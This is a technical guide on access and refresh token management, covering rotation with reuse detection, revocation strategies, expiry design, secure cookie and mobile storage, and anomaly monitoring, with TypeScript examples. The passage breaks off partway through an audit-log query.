# Token Management

> Proper management of Access Tokens and Refresh Tokens is the cornerstone of authentication security. This guide covers token lifecycle design, Refresh Token Rotation, revocation strategies, secure storage, and token monitoring for practical token management.

## What You Will Learn

- [ ] Understand the roles and operations of Access Tokens and Refresh Tokens, and design the entire lifecycle
- [ ] Implement Refresh Token Rotation and its attack detection mechanism
- [ ] Compare token revocation strategies (blacklist, Token Version, RT deletion) and choose based on requirements
- [ ] Design secure token storage and transport on both client and server sides
- [ ] Integrate token monitoring and anomaly detection into production environments

## Prerequisites

- JWT structure and basic signature verification → 02-token-auth/00-jwt-basics.md
- JWT signing algorithms (HS256/RS256/ES256) → 02-token-auth/01-jwt-signing.md
- Differences from session authentication → [01-session-auth/](../01-session-auth/)
- Fundamental authentication concepts → [00-fundamentals/](../00-fundamentals/)
- Security fundamentals → security-fundamentals: 00-basics/

---

## 1. Token Lifecycle

### 1.1 Roles of Access Token and Refresh Token

```
Overview of Access Token and Refresh Token:

  ┌───────────────────────────────────────────────────────────┐
  │                                                           │
  │  Access Token (AT)                                        │
  │  ┌─────────────────────────────────────────────────────┐  │
  │  │ Purpose:   Authorization for API access              │  │
  │  │ Lifetime:  Short-lived (15 minutes to 1 hour)        │  │
  │  │ Verify:    Stateless (signature check only)          │  │
  │  │ Format:    JWT (signed, self-contained token)        │  │
  │  │ Transport: Authorization: Bearer <token>             │  │
  │  └─────────────────────────────────────────────────────┘  │
  │                                                           │
  │  Refresh Token (RT)                                       │
  │  ┌─────────────────────────────────────────────────────┐  │
  │  │ Purpose:   Obtain a new AT                           │  │
  │  │ Lifetime:  Long-lived (7 days to 30 days)           │  │
  │  │ Verify:    Stateful (managed server-side)            │  │
  │  │ Format:    Opaque token (random string)              │  │
  │  │ Transport: HttpOnly Cookie or dedicated endpoint     │  │
  │  └─────────────────────────────────────────────────────┘  │
  │                                                           │
  └───────────────────────────────────────────────────────────┘

  Lifecycle (chronological):

  t=0m:   Login → AT(15m) + RT(7d) issued
  t=14m:  API request → AT valid → success
  t=16m:  API request → AT expired → 401
  t=16m:  Use RT to renew AT → new AT(15m) + new RT(7d) issued
  t=31m:  API request → new AT valid → success
  ...
  t=7d:   RT expired → re-login required
```

### 1.2 Why Two Tokens Are Needed

```
Reasons why two tokens are needed (WHY):

  Problems with a single token:

  Approach ①: AT only (long-lived)
    → Make AT valid for 30 days
    → Convenient, but if leaked, can be abused for 30 days
    → Revoking requires server-side management
    → Loses the stateless advantage

  Approach ②: AT only (short-lived)
    → Make AT valid for 15 minutes
    → High security, but re-login every 15 minutes
    → Severely degrades UX

  Solution: Combination of two tokens
    → AT: Short-lived (15 min) for security
    → RT: Long-lived (7 days) for UX
    → AT: Stateless verification (fast)
    → RT: Stateful management (instantly revocable)

  ┌──────────────┬──────────────┬──────────────┐
  │              │ Security     │ UX           │
  ├──────────────┼──────────────┼──────────────┤
  │ AT long only │ ✗ Low        │ ○ Good       │
  │ AT short only│ ○ High       │ ✗ Poor       │
  │ AT+RT        │ ○ High       │ ○ Good       │
  └──────────────┴──────────────┴──────────────┘
```

### 1.3 Implementing Token Issuance

```typescript
// Complete implementation of token issuance
import { SignJWT, jwtVerify } from 'jose';
import crypto from 'crypto';

// Key configuration
const JWT_SECRET = new TextEncoder().encode(process.env.JWT_SECRET!);
const AT_EXPIRY = '15m';
const RT_EXPIRY_MS = 7 * 24 * 60 * 60 * 1000; // 7 days

// Token hash function
function hashToken(token: string): string {
  return crypto.createHash('sha256').update(token).digest('hex');
}

// Issue Access Token
async function issueAccessToken(userId: string, role: string): Promise<string> {
  return new SignJWT({
    sub: userId,
    role,
    type: 'access',
  })
    .setProtectedHeader({ alg: 'HS256' })
    .setIssuedAt()
    .setExpirationTime(AT_EXPIRY)
    .setJti(crypto.randomUUID()) // unique identifier
    .sign(JWT_SECRET);
}

// Issue Refresh Token
function issueRefreshToken(): string {
  return crypto.randomBytes(32).toString('hex');
}

// Issue token pair on login
async function createTokenPair(userId: string, role: string) {
  const familyId = crypto.randomUUID();
  const accessToken = await issueAccessToken(userId, role);
  const refreshToken = issueRefreshToken();

  // Store RT hashed in DB
  await db.refreshToken.create({
    data: {
      token: hashToken(refreshToken),
      userId,
      familyId,
      expiresAt: new Date(Date.now() + RT_EXPIRY_MS),
    },
  });

  return { accessToken, refreshToken, familyId };
}

// Verify Access Token
async function verifyAccessToken(token: string) {
  try {
    const { payload } = await jwtVerify(token, JWT_SECRET);
    if (payload.type !== 'access') {
      throw new Error('Invalid token type');
    }
    return payload;
  } catch (error) {
    throw new AuthError('Invalid or expired access token');
  }
}
```

---

## 2. Refresh Token Rotation

### 2.1 How Rotation Works

```
What is Refresh Token Rotation:

  Normal refresh (without Rotation):
    RT-1 → new AT + RT-1 (same RT reused)
    → If RT is leaked, attacker can obtain AT indefinitely
    → Cannot respond until RT expires

  With Rotation:
    RT-1 → new AT + RT-2 (new RT issued, RT-1 invalidated)
    RT-2 → new AT + RT-3 (new RT issued, RT-2 invalidated)
    → Each RT is single-use

  Attack detection mechanism:

  ┌────────────────────────────────────────────────────────┐
  │                                                        │
  │  Normal flow:                                          │
  │    Use RT-1 → issue RT-2 (record usedAt on RT-1)      │
  │    Use RT-2 → issue RT-3 (record usedAt on RT-2)      │
  │                                                        │
  │  Attack scenario:                                      │
  │    ① Attacker steals RT-1                              │
  │    ② Legitimate user uses RT-1 → RT-2 issued          │
  │    ③ Attacker uses RT-1 → usedAt already set!         │
  │    ④ Server detects "reuse"                            │
  │    ⑤ Invalidate entire family (RT-1, RT-2, ...)       │
  │    ⑥ Require user to re-login + send security alert   │
  │                                                        │
  └────────────────────────────────────────────────────────┘

  Token Family:
    → Issue a familyId at login time
    → All RTs derived from that login session share the same familyId
    → On reuse detection, bulk-invalidate by familyId
```

### 2.2 Complete Implementation of Rotation

```typescript
// Implementation of Refresh Token Rotation
interface RefreshTokenRecord {
  id: string;
  token: string;         // hashed
  userId: string;
  familyId: string;      // token family
  expiresAt: Date;
  usedAt: Date | null;   // used flag
  replacedBy: string | null; // hash of the successor token
  createdAt: Date;
  ipAddress: string | null;
  userAgent: string | null;
}

class TokenRotationService {
  constructor(
    private db: PrismaClient,
    private logger: Logger
  ) {}

  // Token refresh (with Rotation)
  async refreshTokens(
    refreshToken: string,
    clientInfo: { ip: string; userAgent: string }
  ) {
    const hashedToken = hashToken(refreshToken);

    // Find current RT
    const currentRT = await this.db.refreshToken.findUnique({
      where: { token: hashedToken },
      include: { user: true },
    });

    // RT does not exist
    if (!currentRT) {
      this.logger.warn('Unknown refresh token used', { hashedToken });
      throw new AuthError('Invalid refresh token');
    }

    // Expiry check
    if (currentRT.expiresAt < new Date()) {
      this.logger.info('Expired refresh token used', {
        userId: currentRT.userId,
        familyId: currentRT.familyId,
      });
      throw new AuthError('Refresh token expired');
    }

    // ★ Reuse detection (most critical security check)
    if (currentRT.usedAt) {
      this.logger.error('Refresh token reuse detected!', {
        userId: currentRT.userId,
        familyId: currentRT.familyId,
        originalUseTime: currentRT.usedAt,
        reuseTime: new Date(),
      });

      // Invalidate the entire token family
      await this.db.refreshToken.deleteMany({
        where: { familyId: currentRT.familyId },
      });

      // Send security alert
      await this.notifyTokenReuse(currentRT.userId, clientInfo);

      throw new AuthError('Refresh token reuse detected - all sessions revoked');
    }

    // Generate new token pair
    const newAccessToken = await issueAccessToken(
      currentRT.userId,
      currentRT.user.role
    );
    const newRefreshToken = issueRefreshToken();
    const hashedNewRT = hashToken(newRefreshToken);

    // Atomically update in a transaction
    await this.db.$transaction([
      // Mark current RT as used
      this.db.refreshToken.update({
        where: { id: currentRT.id },
        data: {
          usedAt: new Date(),
          replacedBy: hashedNewRT,
        },
      }),
      // Create new RT
      this.db.refreshToken.create({
        data: {
          token: hashedNewRT,
          userId: currentRT.userId,
          familyId: currentRT.familyId, // same family
          expiresAt: new Date(Date.now() + RT_EXPIRY_MS),
          ipAddress: clientInfo.ip,
          userAgent: clientInfo.userAgent,
        },
      }),
    ]);

    this.logger.info('Token rotation completed', {
      userId: currentRT.userId,
      familyId: currentRT.familyId,
    });

    return {
      accessToken: newAccessToken,
      refreshToken: newRefreshToken,
    };
  }

  // Security alert notification
  private async notifyTokenReuse(
    userId: string,
    clientInfo: { ip: string; userAgent: string }
  ) {
    const user = await this.db.user.findUnique({ where: { id: userId } });
    if (!user?.email) return;

    await sendEmail({
      to: user.email,
      subject: 'Security Alert: Suspicious Token Usage Detected',
      html: `
        <h2>Suspicious activity detected</h2>
        <p>A refresh token for your account has been reused.</p>
        <p>For your safety, all sessions have been invalidated.</p>
        <p><strong>IP:</strong> ${clientInfo.ip}</p>
        <p><strong>User-Agent:</strong> ${clientInfo.userAgent}</p>
        <p>Please log in again. If you did not initiate this, change your password.</p>
      `,
    });
  }
}
```

### 2.3 Managing Token Families

```typescript
// Token Family visualization and management
class TokenFamilyManager {
  constructor(private db: PrismaClient) {}

  // List active sessions for a user
  async getActiveSessions(userId: string) {
    // Get the latest RT for each family
    const latestTokens = await this.db.refreshToken.findMany({
      where: {
        userId,
        usedAt: null, // unused (= active)
        expiresAt: { gt: new Date() }, // not expired
      },
      orderBy: { createdAt: 'desc' },
      select: {
        familyId: true,
        createdAt: true,
        ipAddress: true,
        userAgent: true,
        expiresAt: true,
      },
    });

    return latestTokens.map((t) => ({
      sessionId: t.familyId,
      createdAt: t.createdAt,
      ipAddress: t.ipAddress,
      device: parseUserAgent(t.userAgent),
      expiresAt: t.expiresAt,
    }));
  }

  // Revoke a specific session (logout)
  async revokeSession(userId: string, familyId: string) {
    const deleted = await this.db.refreshToken.deleteMany({
      where: { userId, familyId },
    });

    return { revokedCount: deleted.count };
  }

  // Revoke all sessions (e.g., on password change)
  async revokeAllSessions(userId: string, exceptFamilyId?: string) {
    const where: any = { userId };
    if (exceptFamilyId) {
      where.familyId = { not: exceptFamilyId };
    }

    const deleted = await this.db.refreshToken.deleteMany({ where });
    return { revokedCount: deleted.count };
  }

  // Cleanup expired tokens (periodic batch)
  async cleanupExpiredTokens() {
    const deleted = await this.db.refreshToken.deleteMany({
      where: {
        OR: [
          { expiresAt: { lt: new Date() } },
          // Used and older than 7 days (retained for a period as audit log)
          {
            usedAt: { not: null },
            usedAt: { lt: new Date(Date.now() - 7 * 24 * 60 * 60 * 1000) },
          },
        ],
      },
    });

    return { cleanedCount: deleted.count };
  }
}
```

---

## 3. Client-Side Token Refresh

### 3.1 Automatic Refresh via Axios Interceptor

```typescript
// Automatic refresh via Axios interceptor (complete implementation)
import axios, { AxiosError, AxiosRequestConfig, InternalAxiosRequestConfig } from 'axios';

const api = axios.create({
  baseURL: '/api',
  withCredentials: true, // automatically send Cookies
});

// Refresh state management
let isRefreshing = false;
let failedQueue: Array<{
  resolve: (value?: unknown) => void;
  reject: (error: unknown) => void;
}> = [];

// Process queued requests
function processQueue(error: unknown, token: string | null) {
  failedQueue.forEach(({ resolve, reject }) => {
    if (error) {
      reject(error);
    } else {
      resolve(token);
    }
  });
  failedQueue = [];
}

// Response interceptor
api.interceptors.response.use(
  (response) => response,
  async (error: AxiosError) => {
    const originalRequest = error.config as InternalAxiosRequestConfig & { _retry?: boolean };

    // Return as-is if not 401 or already retried
    if (error.response?.status !== 401 || originalRequest._retry) {
      return Promise.reject(error);
    }

    // Do not retry if the refresh endpoint itself fails
    if (originalRequest.url === '/auth/refresh') {
      return Promise.reject(error);
    }

    // If already refreshing, add to wait queue
    if (isRefreshing) {
      return new Promise((resolve, reject) => {
        failedQueue.push({ resolve, reject });
      }).then(() => api(originalRequest));
    }

    originalRequest._retry = true;
    isRefreshing = true;

    try {
      // Token refresh (sent automatically if Cookie-based)
      await api.post('/auth/refresh');

      // Re-execute queued requests
      processQueue(null, null);

      // Re-execute original request
      return api(originalRequest);
    } catch (refreshError) {
      // Refresh failed → fail all queued requests
      processQueue(refreshError, null);

      // Redirect to login page
      window.location.href = '/login?reason=session_expired';
      return Promise.reject(refreshError);
    } finally {
      isRefreshing = false;
    }
  }
);

export default api;
```

### 3.2 Refresh Implementation with fetch API

```typescript
// Refresh implementation based on fetch API
class AuthenticatedFetch {
  private refreshPromise: Promise<void> | null = null;

  async request(url: string, options: RequestInit = {}): Promise<Response> {
    const response = await fetch(url, {
      ...options,
      credentials: 'include', // send Cookies
    });

    if (response.status === 401) {
      // Attempt to refresh
      await this.refresh();

      // Retry original request
      const retryResponse = await fetch(url, {
        ...options,
        credentials: 'include',
      });

      if (retryResponse.status === 401) {
        // Still 401 after refresh → logout
        this.handleSessionExpired();
        throw new Error('Session expired');
      }

      return retryResponse;
    }

    return response;
  }

  private async refresh(): Promise<void> {
    // Prevent multiple concurrent refreshes
    if (this.refreshPromise) {
      return this.refreshPromise;
    }

    this.refreshPromise = fetch('/api/auth/refresh', {
      method: 'POST',
      credentials: 'include',
    }).then((res) => {
      if (!res.ok) {
        throw new Error('Refresh failed');
      }
    }).finally(() => {
      this.refreshPromise = null;
    });

    return this.refreshPromise;
  }

  private handleSessionExpired(): void {
    // Fire session-expired event
    window.dispatchEvent(new CustomEvent('session-expired'));
    window.location.href = '/login?reason=session_expired';
  }
}

export const authenticatedFetch = new AuthenticatedFetch();
```

### 3.3 Token Management with React Hook

```typescript
// React Hook: session state management
import { useEffect, useCallback, useRef } from 'react';

function useTokenRefresh() {
  const timerRef = useRef<NodeJS.Timeout | null>(null);

  // Calculate remaining AT time and auto-refresh
  const scheduleRefresh = useCallback((expiresIn: number) => {
    if (timerRef.current) {
      clearTimeout(timerRef.current);
    }

    // Refresh when 80% of the token lifetime has elapsed
    const refreshTime = expiresIn * 0.8 * 1000;

    timerRef.current = setTimeout(async () => {
      try {
        const res = await fetch('/api/auth/refresh', {
          method: 'POST',
          credentials: 'include',
        });

        if (res.ok) {
          const data = await res.json();
          scheduleRefresh(data.expiresIn); // schedule next refresh
        } else {
          // Refresh failed
          window.dispatchEvent(new CustomEvent('session-expired'));
        }
      } catch (error) {
        console.error('Token refresh failed:', error);
      }
    }, refreshTime);
  }, []);

  // Cleanup on component unmount
  useEffect(() => {
    return () => {
      if (timerRef.current) {
        clearTimeout(timerRef.current);
      }
    };
  }, []);

  return { scheduleRefresh };
}
```

---

## 4. Token Revocation Strategies

### 4.1 Comparison of Revocation Methods

```
Situations where token revocation is needed:
  → User logs out
  → Password change
  → Account deactivation (e.g., departing employee)
  → Security breach detected
  → User loses a device
  → Administrator forces session termination
  → Immediate reflection after permission change

Comparison of revocation methods:

  ┌─────────────────┬────────────┬──────────────────┬──────────┬──────────────────┐
  │ Method          │ Immediacy  │ Scalability      │ Complexity│ Recommended for  │
  ├─────────────────┼────────────┼──────────────────┼──────────┼──────────────────┤
  │ Short-lived AT  │ △ Low      │ ◎ Best           │ Low      │ General use      │
  │ Blacklist       │ ◎ Instant  │ △ Requires Redis │ Medium   │ High security    │
  │ Token Version   │ ○ Near-instant│ ○ Good        │ Medium   │ Password change  │
  │ RT deletion     │ △ Low      │ ○ Good           │ Low      │ Logout           │
  │ Hybrid          │ ◎ Instant  │ ○ Good           │ High     │ Enterprise       │
  └─────────────────┴────────────┴──────────────────┴──────────┴──────────────────┘

  Details of internal behavior:

  ① Short-lived AT only:
     → Simply wait for the AT to expire (15 minutes)
     → Simplest approach, but revocation is impossible for up to 15 minutes
     → Not acceptable in finance/healthcare

  ② Blacklist:
     → Store revoked AT's JTI in Redis
     → Check blacklist on each API request
     → Auto-delete after AT expiry (TTL)
     → Instant revocation but stateful (Redis dependency)

  ③ Token Version:
     → Manage a version number per user
     → Include version in AT, compare with DB on verification
     → Increment version on password change
     → Requires DB access (can be mitigated with caching)

  ④ RT deletion:
     → Delete RT from DB
     → Next AT renewal fails → re-login
     → No effect while current AT is still valid

  ⑤ Hybrid (recommended):
     → Normal: near-instant revocation with Token Version
     → Emergency: instant revocation with blacklist
     → Logout: RT deletion + blacklist
```

### 4.2 Blacklist Implementation

```typescript
// Token blacklist using Redis
import Redis from 'ioredis';

class TokenBlacklist {
  private redis: Redis;
  private prefix = 'token:blacklist:';

  constructor(redisUrl: string) {
    this.redis = new Redis(redisUrl);
  }

  // Add token to blacklist
  async revoke(jti: string, expiresAt: Date): Promise<void> {
    const ttl = Math.max(
      0,
      Math.ceil((expiresAt.getTime() - Date.now()) / 1000)
    );

    if (ttl > 0) {
      // Retain until AT expiry (auto-deleted afterward)
      await this.redis.setex(`${this.prefix}${jti}`, ttl, '1');
    }
  }

  // Bulk revoke all tokens for a user
  async revokeAllForUser(userId: string): Promise<void> {
    // Token Version is better suited for per-user bulk revocation
    // Blacklist is used for individual token revocation
    await this.redis.setex(
      `${this.prefix}user:${userId}`,
      900, // 15 minutes (maximum AT lifetime)
      Date.now().toString()
    );
  }

  // Check if a token has been revoked
  async isRevoked(jti: string, userId: string, issuedAt: number): Promise<boolean> {
    // Check individual token
    const tokenRevoked = await this.redis.exists(`${this.prefix}${jti}`);
    if (tokenRevoked) return true;

    // Check per-user bulk revocation
    const userRevokedAt = await this.redis.get(`${this.prefix}user:${userId}`);
    if (userRevokedAt && issuedAt < parseInt(userRevokedAt)) {
      return true;
    }

    return false;
  }
}

// AT verification with blacklist
const blacklist = new TokenBlacklist(process.env.REDIS_URL!);

async function verifyAccessTokenWithBlacklist(token: string) {
  const payload = await verifyAccessToken(token);

  const isRevoked = await blacklist.isRevoked(
    payload.jti as string,
    payload.sub as string,
    payload.iat as number
  );

  if (isRevoked) {
    throw new AuthError('Token has been revoked');
  }

  return payload;
}
```

### 4.3 Token Version Implementation

```typescript
// Revocation via Token Version
async function issueAccessTokenWithVersion(userId: string): Promise<string> {
  const user = await db.user.findUnique({
    where: { id: userId },
    select: { role: true, tokenVersion: true },
  });

  if (!user) throw new AuthError('User not found');

  return new SignJWT({
    sub: userId,
    role: user.role,
    token_version: user.tokenVersion, // include version
    type: 'access',
  })
    .setProtectedHeader({ alg: 'ES256' })
    .setIssuedAt()
    .setExpirationTime('15m')
    .setJti(crypto.randomUUID())
    .sign(privateKey);
}

// Check version during verification
async function verifyWithTokenVersion(token: string) {
  const { payload } = await jwtVerify(token, publicKey);

  // Get user's current version from DB
  const user = await db.user.findUnique({
    where: { id: payload.sub as string },
    select: { tokenVersion: true, active: true },
  });

  if (!user) {
    throw new AuthError('User not found');
  }

  if (!user.active) {
    throw new AuthError('User account is deactivated');
  }

  // Version mismatch → revoked
  if (user.tokenVersion !== payload.token_version) {
    throw new AuthError('Token has been revoked (version mismatch)');
  }

  return payload;
}

// On password change: invalidate all tokens
async function changePassword(userId: string, newPassword: string) {
  const hashedPassword = await bcrypt.hash(newPassword, 12);

  await db.$transaction([
    // Update password + increment version
    db.user.update({
      where: { id: userId },
      data: {
        password: hashedPassword,
        tokenVersion: { increment: 1 }, // bump version
      },
    }),
    // Also delete all Refresh Tokens
    db.refreshToken.deleteMany({ where: { userId } }),
  ]);
}

// On role change
async function updateUserRole(userId: string, newRole: string) {
  await db.user.update({
    where: { id: userId },
    data: {
      role: newRole,
      tokenVersion: { increment: 1 }, // bump version on role change too
    },
  });

  // Also delete all RTs to require re-login
  await db.refreshToken.deleteMany({ where: { userId } });
}
```

---

## 5. Token Expiry Design

### 5.1 Recommended Expiry Reference

```
Token expiry design guide:

  ┌──────────────────┬──────────────┬────────────────────────────────────┐
  │ Token Type       │ Recommended  │ Reason                             │
  ├──────────────────┼──────────────┼────────────────────────────────────┤
  │ Access Token     │ 15 minutes   │ Balance between leak risk and UX   │
  │ Refresh Token    │ 7 days       │ Weekly re-login is acceptable      │
  │ ID Token         │ 1 hour       │ Freshness of user info             │
  │ Remember Me      │ 30 days      │ Long session chosen by user        │
  │ Password Reset   │ 1 hour       │ Short-lived to reduce abuse risk   │
  │ Email Verify     │ 24 hours     │ Grace period for email confirmation│
  │ API Key          │ No expiry    │ Managed via rotation               │
  │ OAuth State      │ 10 minutes   │ CSRF protection, keep short-lived  │
  │ CSRF Token       │ Sync with session│ Same lifetime as session       │
  │ MFA Code         │ 5 minutes    │ Short-lived to prevent brute force │
  └──────────────────┴──────────────┴────────────────────────────────────┘

  Industry-specific adjustments:

  ┌──────────────────┬─────────┬─────────┬─────────────────────────────┐
  │ Industry         │ AT TTL  │ RT TTL  │ Additional Requirements     │
  ├──────────────────┼─────────┼─────────┼─────────────────────────────┤
  │ General web app  │ 15 min  │ 7 days  │ -                           │
  │ Finance/Healthcare│ 5 min  │ 1 hour  │ Re-auth for critical ops    │
  │ Social media     │ 1 hour  │ 30 days │ UX-focused                  │
  │ Mobile app       │ 15 min  │ 90 days │ Biometric re-auth           │
  │ B2B SaaS         │ 15 min  │ 14 days │ Overridable by org policy   │
  │ IoT device       │ 1 hour  │ 365 days│ Used alongside device cert  │
  └──────────────────┴─────────┴─────────┴─────────────────────────────┘
```

### 5.2 Dynamic Expiry Configuration

```typescript
// Dynamic expiry based on user risk level
interface TokenExpiryConfig {
  accessTokenTTL: number; // seconds
  refreshTokenTTL: number; // milliseconds
}

function getTokenExpiry(context: {
  user: { role: string; mfaEnabled: boolean };
  request: { ip: string; userAgent: string };
  org?: { sessionPolicy?: string };
}): TokenExpiryConfig {
  // Organization policy takes highest priority
  if (context.org?.sessionPolicy === 'strict') {
    return {
      accessTokenTTL: 5 * 60,       // 5 minutes
      refreshTokenTTL: 60 * 60 * 1000, // 1 hour
    };
  }

  // Shorter expiry for admins
  if (context.user.role === 'admin' || context.user.role === 'super_admin') {
    return {
      accessTokenTTL: 10 * 60,       // 10 minutes
      refreshTokenTTL: 24 * 60 * 60 * 1000, // 1 day
    };
  }

  // Slightly longer if MFA is enabled (enhanced security)
  if (context.user.mfaEnabled) {
    return {
      accessTokenTTL: 30 * 60,       // 30 minutes
      refreshTokenTTL: 14 * 24 * 60 * 60 * 1000, // 14 days
    };
  }

  // Default
  return {
    accessTokenTTL: 15 * 60,        // 15 minutes
    refreshTokenTTL: 7 * 24 * 60 * 60 * 1000, // 7 days
  };
}
```

---

## 6. Secure Token Storage

### 6.1 Comparison of Storage Locations

```
Client-side token storage options:

  ┌──────────────────┬──────────┬──────────┬──────────┬────────────────────┐
  │ Storage          │ XSS-safe │ CSRF-safe│ Persistent│ Recommendation     │
  ├──────────────────┼──────────┼──────────┼──────────┼────────────────────┤
  │ HttpOnly Cookie  │ ◎        │ △ needs  │ ○        │ ★★★ Best          │
  │ Memory variable  │ ◎        │ ◎        │ ✗ None   │ ★★ AT only        │
  │ sessionStorage   │ △ XSS weak│ ◎       │ △ Tab only│ ★ Limited use     │
  │ localStorage     │ ✗ XSS weak│ ◎       │ ○        │ ✗ Not recommended  │
  │ Cookie (non-HttpOnly)│ ✗ XSS weak│ △   │ ○        │ ✗ Not recommended  │
  └──────────────────┴──────────┴──────────┴──────────┴────────────────────┘

  Why HttpOnly Cookie is most recommended:
    → Inaccessible from JavaScript (cannot be stolen via XSS)
    → Restricted to HTTPS only with Secure flag
    → CSRF mitigated with SameSite flag
    → Sent automatically by browser (simpler frontend implementation)

  CSRF countermeasures for HttpOnly Cookie:
    → SameSite=Lax (default) or SameSite=Strict
    → Double Submit Cookie pattern
    → Combined use of CSRF tokens
```

### 6.2 Cookie Configuration Implementation

```typescript
// Secure Cookie configuration
import { NextResponse } from 'next/server';

function setTokenCookies(
  response: NextResponse,
  tokens: { accessToken: string; refreshToken: string }
) {
  const isProduction = process.env.NODE_ENV === 'production';

  // Access Token Cookie
  response.cookies.set('access_token', tokens.accessToken, {
    httpOnly: true,      // inaccessible from JavaScript
    secure: isProduction, // HTTPS only (production)
    sameSite: 'lax',     // CSRF protection
    path: '/api',         // only sent to API endpoints
    maxAge: 15 * 60,      // 15 minutes
  });

  // Refresh Token Cookie
  response.cookies.set('refresh_token', tokens.refreshToken, {
    httpOnly: true,
    secure: isProduction,
    sameSite: 'strict',   // stricter CSRF protection
    path: '/api/auth',     // only sent to auth endpoints
    maxAge: 7 * 24 * 60 * 60, // 7 days
  });

  return response;
}

// Remove Cookies (on logout)
function clearTokenCookies(response: NextResponse) {
  response.cookies.set('access_token', '', {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'lax',
    path: '/api',
    maxAge: 0,
  });

  response.cookies.set('refresh_token', '', {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
    path: '/api/auth',
    maxAge: 0,
  });

  return response;
}
```

### 6.3 Secure Storage in Mobile Apps

```typescript
// React Native: Using Secure Storage
import * as SecureStore from 'expo-secure-store';

class SecureTokenStorage {
  private static readonly AT_KEY = 'access_token';
  private static readonly RT_KEY = 'refresh_token';

  // Save tokens (encrypted storage)
  static async saveTokens(tokens: {
    accessToken: string;
    refreshToken: string;
  }): Promise<void> {
    await Promise.all([
      SecureStore.setItemAsync(this.AT_KEY, tokens.accessToken, {
        keychainAccessible: SecureStore.WHEN_UNLOCKED_THIS_DEVICE_ONLY,
      }),
      SecureStore.setItemAsync(this.RT_KEY, tokens.refreshToken, {
        keychainAccessible: SecureStore.WHEN_UNLOCKED_THIS_DEVICE_ONLY,
      }),
    ]);
  }

  // Retrieve tokens
  static async getAccessToken(): Promise<string | null> {
    return SecureStore.getItemAsync(this.AT_KEY);
  }

  static async getRefreshToken(): Promise<string | null> {
    return SecureStore.getItemAsync(this.RT_KEY);
  }

  // Delete tokens (on logout)
  static async clearTokens(): Promise<void> {
    await Promise.all([
      SecureStore.deleteItemAsync(this.AT_KEY),
      SecureStore.deleteItemAsync(this.RT_KEY),
    ]);
  }
}
```

---

## 7. Token Monitoring and Anomaly Detection

### 7.1 Metrics to Monitor and Anomaly Patterns

```
Token monitoring design:

  Monitoring metrics:
  ┌───────────────────────────┬──────────────────────────────────┐
  │ Metric                    │ Anomaly threshold                 │
  ├───────────────────────────┼──────────────────────────────────┤
  │ Refresh frequency         │ 3 or more times within 5 minutes │
  │ Concurrent active sessions│ 10 or more per user              │
  │ Geographic distance       │ Impossible travel in short time  │
  │ Failed refreshes          │ 10 or more per hour              │
  │ Blacklist size            │ Rapid growth (sign of attack)    │
  │ RT reuse detection        │ Alert on even 1 incident         │
  │ Unknown User-Agent        │ Detect pattern change            │
  └───────────────────────────┴──────────────────────────────────┘
```

### 7.2 Anomaly Detection Implementation

```typescript
// Token usage monitoring and anomaly detection
class TokenMonitor {
  constructor(
    private redis: Redis,
    private logger: Logger,
    private alertService: AlertService
  ) {}

  // Record refresh event
  async recordRefresh(userId: string, metadata: {
    ip: string;
    userAgent: string;
    familyId: string;
    timestamp: Date;
  }) {
    const key = `token:refresh:${userId}`;

    // Store recent refresh history in a Redis sorted set
    await this.redis.zadd(
      key,
      metadata.timestamp.getTime(),
      JSON.stringify(metadata)
    );

    // Remove entries older than 1 hour
    await this.redis.zremrangebyscore(
      key,
      '-inf',
      Date.now() - 60 * 60 * 1000
    );

    // Check for anomaly patterns
    await this.checkAnomalies(userId, metadata);
  }

  private async checkAnomalies(userId: string, current: {
    ip: string;
    userAgent: string;
    familyId: string;
    timestamp: Date;
  }) {
    const key = `token:refresh:${userId}`;

    // 1. Refresh frequency check (3 or more times within 5 minutes)
    const recentCount = await this.redis.zcount(
      key,
      Date.now() - 5 * 60 * 1000,
      '+inf'
    );

    if (recentCount >= 3) {
      this.logger.warn('High refresh frequency detected', {
        userId,
        count: recentCount,
        window: '5m',
      });
    }

    // 2. Concurrent session count check
    const activeSessions = await this.redis.scard(`active_sessions:${userId}`);
    if (activeSessions > 10) {
      this.alertService.send({
        severity: 'high',
        type: 'excessive_sessions',
        userId,
        message: `User has ${activeSessions} active sessions`,
      });
    }

    // 3. Geographic anomaly check (Impossible Travel)
    const lastRefresh = await this.getLastRefresh(userId);
    if (lastRefresh && lastRefresh.ip !== current.ip) {
      const timeDiff = current.timestamp.getTime() -
        new Date(lastRefresh.timestamp).getTime();
      const distance = await this.calculateGeoDistance(
        lastRefresh.ip,
        current.ip
      );

      // Travel of 1000 km or more within 1 hour is impossible
      if (timeDiff < 60 * 60 * 1000 && distance > 1000) {
        this.alertService.send({
          severity: 'critical',
          type: 'impossible_travel',
          userId,
          message: `Impossible travel detected: ${distance}km in ${timeDiff / 1000}s`,
          metadata: { fromIp: lastRefresh.ip, toIp: current.ip },
        });
      }
    }
  }

  private async getLastRefresh(userId: string) {
    const key = `token:refresh:${userId}`;
    const entries = await this.redis.zrevrange(key, 1, 1);
    return entries[0] ? JSON.parse(entries[0]) : null;
  }

  private async calculateGeoDistance(ip1: string, ip2: string): Promise<number> {
    // GeoIP lookup (e.g., MaxMind GeoLite2)
    // Simplified and omitted here
    return 0;
  }
}
```

### 7.3 Audit Log Implementation

```typescript
// Audit log for token operations
interface TokenAuditLog {
  id: string;
  userId: string;
  action: 'token_issued' | 'token_refreshed' | 'token_revoked' |
          'token_reuse_detected' | 'all_tokens_revoked' | 'session_expired';
  familyId?: string;
  ipAddress: string;
  userAgent: string;
  metadata?: Record<string, unknown>;
  createdAt: Date;
}

class TokenAuditService {
  constructor(private db: PrismaClient) {}

  async log(entry: Omit<TokenAuditLog, 'id' | 'createdAt'>) {
    await this.db.tokenAuditLog.create({
      data: {
        ...entry,
        metadata: entry.metadata ? JSON.stringify(entry.metadata) : null,
      },
    });
  }

  // List token activity for a user
  async getUserActivity(userId: string, options: {
    limit?: number;
    offset?: number;
    action?: string;
  } = {}) {
    return this.db.tokenAuditLog.findMany({
      where: {
        userId,
        ...(options.action ? { action: options.action } : {}),
      },
      orderBy: { createdAt: 'desc' },
      take: options.limit ?? 50,
      skip: options.offset ?? 0,
    });
  }

  // Search for suspicious activity
  async findSuspiciousActivity(timeWindow: number = 24 * 60 * 60 * 1000) {
    const since = new Date(Date.now() - timeWindow);

    return this.db.tokenAuditLog.groupBy({
      by: ['userId', 'action'],
      where: {
        action: { in: ['token_reuse_detected', 'all_tokens_revoked'] },
        createdAt: { gte: since },
